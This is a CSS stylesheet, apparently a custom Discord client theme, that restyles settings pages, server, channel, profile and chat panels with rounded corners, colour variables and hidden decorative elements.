/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Authorized Apps ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Connections ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Social Icons Background */
.accountBtn-2Nozo3 .accountBtnInner-sj5jLs {
    background-color: var(--Color003);
	border-radius: 90px;
}

/* Social Card */
.theme-dark .elevationLow-2lY09M {
    -webkit-box-shadow: none;
    box-shadow: none;
	border-radius: 24px;
}

.connectionHeader-2MDqhu {
    background: transparent;
}

.connectionDelete-2Odoln {
    border: 1px solid var(--Color006);
    border-radius: 90px;
}

.connectionDelete-2Odoln:hover {
    border: 1px solid var(--Color007);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| User Settings | Billing ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Indicator */

.theme-dark .defaultIndicator-G3c16x {
    background: var(--Color002);
    color: var(--Color007);
	border-radius: 90px;
}

.theme-dark .premiumIndicator-1XvbfM {
    background: var(--Color001);
    color: #fff;
	border-radius: 90px;
}

/* Payment History | Background*/

.theme-dark .paginator-166-09 {
    background-color: var(--Color004);
}

/* Payment History | Header */

.theme-dark .paymentPane-3bwJ6A{
    background: var(--Color003);
    border-radius: 24px 24px 0 0;
    color: var(--Color007);
}

/* Payment History | Items */

.theme-dark .payment-xT17Mq {
    background: var(--Color002);
    color: var(--Color008);
}

/* Payment History | Footer */

.pageActions-1SVAnA {
    background: var(--Color003);
    border-radius: 0 0 24px 24px;
    color: var(--Color007);
}


.theme-dark .bottomDivider-1K9Gao {
    border-bottom-color: var(--Color003);
}

.theme-dark .expandedInfo-3kfShd {
    background: var(--Color003);
	border-radius: 24px;
}


/* Payment History | Buttons */

.theme-dark .pageButtonNext-V2kUq0, .pageButtonPrev-1Y-47D, .pageIndicator-1gAbyA {
    border: none;
    background: var(--Color003);
}

.pageButtonPrev-1Y-47D, .pageButtonNext-V2kUq0 {
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Subscriptions |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Banner */

.tier2-3hSil0.banner-3Kac2g {
    background: var(--Color001);
    border-radius: 24px;
}

.bannerBackgroundImage-1DMjWi {
	border-radius: 24px;
}

/* No Header */

.hero-EvfTTA {
    display: none;
}

.detailsBlock-FoDTGA {
    background: var(--Color003);
    border-radius: 24px;
}

.hero-EvfTTA {
    border-radius: 24px;
}

/* Input */

.lookFilled-1h1y05.select-1Pkeg4 {
    background: var(--Color005);
    border-radius: 24px;
    border: none;
}

.lookFilled-1h1y05.popout-2sKjHu {
    background: var(--Color005);
    border-radius: 24px;
    border: none;
    margin-top: -38px;

}

.optionActive-KkAdqq, .optionFocused-8MflSE {
    background: var(--Color005);
}

.lookFilled-1h1y05 .arrow-2KJjTM {
    z-index: 20;
    color: var(--Color007);
}

/* Nitro Includes */

.base-1x0h_U {
    color: var(--Color007);
}

.size32-o_H79z {
    font-size: 22px;
    line-height: 20px;
}

.theme-dark .feature-2w65J5 {
    background: var(--Color003);
}

.feature-2w65J5 {
    border-radius: 24px;
    min-height: 90px;
}

.featureGrid-3-fNl- {
    grid-template-columns: repeat(auto-fill,322px);
}

.featureImageWrapper-pPDLjm {
    display: none;
}

/* Buy Nitro */

.marketingRefreshTier2Cta-bw9Vyc {
    background: var(--Color003);
    border-radius: 24px;
    padding: 24px;
    text-align: center;
    margin-top: 48px;
    border: none;
}

/* Buy Nitro Classic */

.marketingRefreshTier1Logo-sY6Lgd {
    color: var(--header-primary);
    display: block;
    height: 20px;
    margin-bottom: 8px;
    width: 194px;
}

.marketingRefreshSectionTier1-dRwS-6 {
    background: var(--Color003);
    border-radius: 24px;
    padding: 24px;
    text-align: center;
    margin-top: 48px;
    border: none;
}


.marketingRefreshTier1Graphic-9B12wx {
    display: none;
    height: 148px;
    margin-right: 60px;
    width: 175px;
}
/* Buy Nitro Classic | Buttons */

.buttons-2-EdE8 {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    justify-content: center;
}

/* Info */

.finePrint-ULGqdp {
    border: none;
}

.finePrint-ULGqdp {
    background: var(--Color005);
    border-radius: 24px;
    padding: 24px;
    font-size: 13px;
    line-height: 16px;
    text-align: justify;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Gift Inventory ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/



/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Server Boost ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Active Server Boost */

.guildHeader-3nh5RK {
    border-radius: 24px 24px 0 0;
    background-color: var(--Color003);
}

.guildSubscriptionSlots-JPXXvN {
    background-color: var(--Color003);
}

.guildHeaderBackground-1G51bM {
    display: none;
}

/* Icons */

.memberBadgeIcon-1hpSQc, .roleIcon-F8XDd3, .emojiIcon-2xOPMD, .audioQualityIcon-1KNkhv, .uploadSizeIcon-2HNa5p {
    color: var(--Color001);
}

/* Cards */

.cardWrapper-2Min21 {
    border-radius: 24px;
}

/* No Logo */

.marketingLogo-1D8DV6 {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | HypeSquad |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.membershipDialogHouse2-35h9SY {
    background-color: var(--Color001);
    border-radius: 24px;
}

.videoWrapper-3YdgHH {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Voice & Video |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.videoGridWrapper-2BDlMX {
    background: #000;
}

/* Grabber */

.grabber-3mFHz2 {
    background-color: var(--Color006);
    border-radius: 90px;
    height: 16px;
    width: 16px;
    margin-top: -8.5px;
    margin-left: -5px;
}

/* Mic Test */

.theme-dark .notches-1sAcEM.gray-3_LNYR {
    display: none;

}

.theme-dark .progress-1IcQ3A, .wrapper-3Z-vWm {
    background: var(--Color003);

}

.wrapper-3Z-vWm {
    background: var(--Color003);

}

/* Preview */

.theme-dark .userSettingsVoice-iwdUCU .previewOverlay-2O7_KC {
    background: var(--Color005);
    border-radius: 24px;
}

.userSettingsVoice-iwdUCU .media-engine-video {
    border-radius: 24px;
    border: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Overlay |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Notifications |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Keybinds ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Game Activity |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-dark .card-FDVird{
    background: var(--Color003);
    border-radius: var(--Radius002);
    box-shadow: none;
}

.theme-dark .card-FDVird::before{
    background: var(--Color003);
    border-radius: var(--Radius002);
    box-shadow: none;
}

/* Add Game */

.theme-dark .notDetected-33MY4s, .theme-light .notDetected-33MY4s {
    background: var(--Color002);
    border-radius: var(--Radius002);

}

/* Game */

.game-1ipmAa {
    position: relative;
    padding: 20px;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Text & Images |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Appearance ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Streamer Mode |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Language ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .codeRedemptionRedirect-1wVR4b {
    color: var(--Color007);
    background: var(--Color005);
    border: none;
}

.theme-dark .item-3eFBNF.selected-2DeaDa {
    background: var(--Color002);
    border-radius: var(--Radius002);
    box-shadow: none;
}

.theme-dark .item-3eFBNF {
    background: var(--Color003);
    border-radius: var(--Radius002);
    margin-top: 20px;
    padding: 20px;
    box-shadow: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Windows Settings ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Change Log ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* No Guild Separator */

#app-mount .wrapper-1Rf91z.guilds-1SWlCJ .guildSeparator-3s64Iy {
    display: none;
}

/* Background */

.guilds-1SWlCJ .scroller-2TZvBN {
    padding-top: 80px;
    padding-bottom: 80px;
}

.wrapper-1Rf91z {
    background-color: transparent;
}

.scroller-2TZvBN {
    background-color: var(--Color004);
	border-radius: 0 38px 38px 0;
	margin-bottom: 25px;
	margin-top: 12px;
    contain: unset !important;
}

.layer-3QrUeG.baseLayer-35bLyl {
    background: var(--Color003);
}

/* Button Color */

.childWrapper-anI2G9 {
    background: var(--Color003);
    color: var(--Color008);
}

.circleIconButton-jET_ig {
    color: var(--Color008);
    background-color: var(--Color003);
}

/* Home Button */

.tutorialContainer-1v44GL {
    background: var(--Color005);
	border-radius: 0 90px 90px 0;
    position: fixed;
    z-index: 3;
	padding-bottom: 4px;
    padding-top: 10px;
    top:calc(var(--titlebar-height) + 13px);
    margin-top: 11.6px;
}

/* Create Server Button */

.tutorialContainer-SGrQ1h {
    background: var(--Color005);
	border-radius: 0 90px 90px 0;
    position: fixed;
    z-index: 3;
	padding-bottom: 4px;
    padding-top: 12px;
    margin-bottom: 23px;
    bottom: calc(var(--titlebar-height) -0px);
}


/* Closed Folder */

.closedFolderIconWrapper-15K9MK {
    background: var(--Color004);
}

/* Open Folder */

.folder-21wGz3 {
    border-radius: 90px;
    background-color: var(--Color002);
}

.expandedFolderBackground-2sPsd- {
    background: var(--Color003);
    border-radius: 90px;
}

/* Round Home Button */

.wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9, .wrapper-1BJsBx:hover .childWrapper-anI2G9 {
    background: var(--Color001);
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Channel Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.container-PNkimc {
    background: var(--Color003);
}

/* background */

.clickable-2ap7je {
    background: var(--Color004);
}

.clickable-2ap7je {
	border-radius: 24px 24px 0 0;
}

.clickable-2ap7je .header-2o-2hj {
    background: transparent;
    height: 46px;
}

.animatedContainer-1pJv5C, .bannerImage-1jOskm {
	z-index: 2;
	border-radius: 24px;
    position: absolute;
    height: 120px;
}

.sidebar-2K8pFh {
    width: 236px;
}

.scroller-2wx7Hm {
    background: var(--Color004);
	padding-bottom: 30px;
    border-radius: 0px;
    margin-bottom: -30px;
}

/* Content */

.containerDefault-1ZnADq, .clickable-18m--O {
	padding-right: 8px;
}

/* Selector */

.modeSelected-1zApJ_ .content-3at_AU, .modeSelected-1zApJ_:hover .content-3at_AU {
    background-color: var(--Color003);
	border-radius: 90px;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Profile Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Game */

.panel-24C3ux {
	z-index: 9;
	position: relative;
    background: var(--Color005);
    border-radius: var(--Radius001) var(--Radius001) 0 0;
    padding-bottom: 80px;
    margin-bottom: -70px;
}

/* Voice */

.container-1giJp5 {
	z-index: 9;
    position: relative;
    background: var(--Color005);
	border-radius: var(--Radius001);
    padding-bottom: 80px;
    margin-bottom: -70px;

}

.button-1YfofB.buttonColor-7qQbGO {
    background-color: var(--Color003);
    color: var(--Color007);
}

/* Profile */

.container-3baos1 {
	z-index: 1000;
	position: relative;
	background: var(--Color005);
	border-radius: var(--Radius001);
}

.panels-j1Uci_ {
	background: var(--Color003);
}
/* Profile Hover */

.panels-j1Uci_ > .container-3baos1:hover button.button-14-BFJ{
  display: block;
}

.panels-j1Uci_ > .container-3baos1 button[aria-checked="false"], .panels-j1Uci_ > .container-3baos1 button:not([role="switch"]) {
  display: none;
}

/* Game Icon */

.gameIcon-gg34Dz, .icon-3Oovq9 {
    border-radius: var(--Radius002);
    color: var(--Color006);
}

/* No Shaddow */

.panels-j1Uci_ > .container-3baos1:last-child .nameTag-3uD-yy {
    text-shadow: none;
}


.panels-j1Uci_ > .container-3baos1:last-child .avatar-SmRMf2.wrapper-3t9DeA, .panels-j1Uci_ > .container-3baos1:last-child .nameTag-3uD-yy, .panels-j1Uci_ > .container-3baos1:last-child .button-38aScr {
    filter: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Topic Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* No Divider */

.content-yTz4x3:before, .divider-3FBTu8{
    display: none;
}

:root{
    --elevation-low: none;
}

.channelNotice-3DDmsB{
    box-shadow: none;
}

.attachWrapper-2TRKBi, .panel-24C3ux, .peopleListItem-2nzedh, .rowWrapper-2fB6P0+.rowWrapper-2fB6P0 .row-ZLfFhY, .header-39GIC8, .headerCell-3L6rFG{
    border: none;
}

/* Channel Info */

.children-19S4PO {
	background: var(--Color004);
	border-radius: 90px;
	Padding: 6px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Tool Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.toolbar-1t6TWx {
	background: var(--Color004);
	border-radius: 90px;
    Padding: 6px;
    margin-left: 20px;
}

.container-1r6BKw {
    padding-right: 12px;
    padding-left: 0px;
}

/* Selected Icon */

.selected-1GqIat .icon-22AiRD {
    color: var(--Color006);
}

/* Update Icon */

.updateIconForeground-3tnNZn {fill: var(--Color010)}
.updateIconForeground-3tnNZn:hover {fill: var(--Color010)}
.updateIconForeground-3tnNZn:active {fill: var(--Color010)}

/* Searchbar */

.searchBar-3dMhjb {
    background: transparent;
}

/* Follow Button */

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6 {
    background: var(--Color001);
}

.container-1r6BKw.themed-ANHk51 {
    background: var(--Color003);
	height: 60px;
}

.header-2o-2hj {
    position: relative;
    font-weight: 500;
    padding: 0 16px;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    z-index: 3;
    -webkit-transition: background-color .1s linear;
    transition: background-color .1s linear;
    color: var(--header-primary);
    -webkit-box-shadow: var(--elevation-low);
    box-shadow: var(--elevation-low);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.content-yTz4x3 {
    padding-right: 12px;
}

.chatContent-a9vAAp {
    background-color: var(--Color004);
	border-radius: 24px;
	margin-bottom: 28px;
}

.content-yTz4x3 {
    background-color: var(--Color003);
}



/* No Scrollbar*/

.scrollerBase-289Jih::-webkit-scrollbar{
    display: none;
}
/* Reaction */

.reaction-1hd86g {
    background: var(--Color003);
    border-radius: 1rem;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Round Media |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Round Image */

.imageWrapper-2p5ogY {
    border-radius: 24px;
}

/* Round video */

.wrapper-2TxpI8 {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Embed |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.embedFull-2tM8-- {
    background: var(--Color005);
    border-top-right-radius: 24px;
	border-bottom-right-radius: 24px;
    border-left: 5px solid var(--Color001);
}

.embedAuthorName-3mnTWj, .embedAuthorNameLink-1gVryT, .embedDescription-1Cuq9a, .embedFieldName-NFrena, .embedFieldValue-nELq2s, .embedFooterText-28V_Wb, .embedLink-1G1K1D, .embedProvider-3k5pfl, .embedTitle-3OXDkz, .embedTitleLink-1Zla9e {
    text-align: left;
}

.imageWrapper-2p5ogY {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Mention |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

#app-mount .chat-3bRxxu .messagesWrapper-3lZDfY .cozyMessage-3V1Y8y:not(.groupStart-23k01U) {
  padding-bottom: 20px;
  margin-top: -22px;
  border-bottom-right-radius: 24px;
  border-bottom-left-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Quotes like embeds ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .blockquoteContainer-U5TVEi blockquote {
    background-color: var(--Color003);
    border-color: var(--Color003);

}

.blockquoteContainer-U5TVEi blockquote {
    border: 2px solid;
    border-top-right-radius: 24px;
 	border-bottom-right-radius: 24px;
    padding: 8px 12px 4px;
   	margin-bottom: 20px;

}

.blockquoteContainer-U5TVEi .blockquoteDivider-2hH8H6 {
    border-radius: 4px 0px 0px 4px;
  	background-color: var( --Color001);
    margin-bottom: 20px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Download ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
